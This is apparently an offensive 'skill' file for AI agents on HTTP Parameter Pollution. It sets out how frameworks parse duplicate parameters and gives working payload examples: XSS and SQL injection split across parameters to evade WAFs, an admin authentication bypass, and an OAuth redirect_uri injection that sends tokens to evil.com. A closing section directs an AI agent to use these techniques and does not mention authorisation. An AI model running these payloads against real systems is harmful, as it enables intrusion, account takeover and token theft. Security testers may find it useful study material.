# HTTP Parameter Pollution (HPP) Skill

## Goal

Exploit parameter parsing inconsistencies to bypass security controls, manipulate logic, or inject payloads.

## Methodology

1. **Identify Multi-Layer Architecture:** Find apps with proxies, load balancers, or multiple parsers
2. **Test Parameter Handling:** Observe how duplicate parameters are processed
3. **Exploit Parsing Differences:** Use different handlers' behavior to bypass filters
4. **Bypass WAF/Filters:** Evade security controls via HPP
5. **Manipulate Logic:** Change application behavior by polluting parameters

## Parameter Parsing Behavior by Technology

| Technology | Behavior | Example |
|-----------|----------|---------|
| PHP | Last value | a=1&a=2 → a=2 |
| ASP/IIS | All values | a=1&a=2 → a=1,2 |
| Python/Flask | First value | a=1&a=2 → a=1 |
| Python/Django | Last value | a=1&a=2 → a=2 |
| Node.js/Express | First value | a=1&a=2 → a=1 |
| Ruby/Rails | Last value | a=1&a=2 → a=2 |
| Java/Servlet | First value | a=1&a=2 → a=1 |
| Perl/CGI | First value | a=1&a=2 → a=1 |

## Server-Side HPP

```bash
# WAF checks first value, backend uses last
?id=1&id=<script>alert(1)</script>
# WAF sees: id=1 (safe)
# Backend uses: id=<script>...

# Authentication bypass
?user=guest&user=admin
# Check: user=guest
# Session: user=admin
```

## Client-Side HPP

```html
<!-- Inject parameters via reflected input -->
<!-- Original: /vote?poll=1&vote=yes -->

<!-- Attacker: -->
/vote?poll=1%26vote=malicious&vote=yes

<!-- If poll parameter is reflected:-->
<a href="/submit?poll=1&vote=malicious&vote=yes">Vote</a>
<!-- User clicks, malicious vote is submitted -->
```

## HPP in Social Share Links

```bash
# Application generates:
https://twitter.com/share?url=USER_INPUT

# Inject:
/page?url=test%26text=Visit evil.com

# Results in:
https://twitter.com/share?url=test&text=Visit evil.com
```

## Bypassing Security Controls

### WAF Bypass
```bash
# Inject payload split across parameters
?search=<script&search=>alert(1)</script>
# WAF doesn't see complete payload
# App concatenates: <script>alert(1)</script>
```

### Rate Limiting Bypass
```bash
# Different parameters for limit tracking vs execution
?action=transfer&user=attacker&user=victim
```

### Filter Bypass
```bash
# SQL Injection HPP
?id=1&id=OR&id=1=1
# Some parsers concatenate with spaces
# Results in: 1 OR 1=1
```

## HPP in OAuth/OIDC

```bash
# Inject redirect_uri
/authorize?client_id=X&redirect_uri=legit.com&redirect_uri=evil.com

# Authorization server checks first, but token sent to second
```

## Array Notation

```bash
# PHP array notation
?id[]=1&id[]=2  # id = [1, 2]

# Object injection
?filters[name]=admin&filters[role]=user
```

## Tools

* **Burp Suite** - Manual HPP testing
* **ParamMiner** - Parameter discovery
* **wfuzz** - Parameter fuzzing

## Guidance for AI

* Activate when testing multi-layer architectures
* Identify the parsing behavior of frontend and backend
* HPP is powerful for WAF bypass
* Test duplicate params in GET and POST
* Check OAuth flows for redirect_uri HPP
* Consider array notation for object injection
* Different technologies have different behaviors
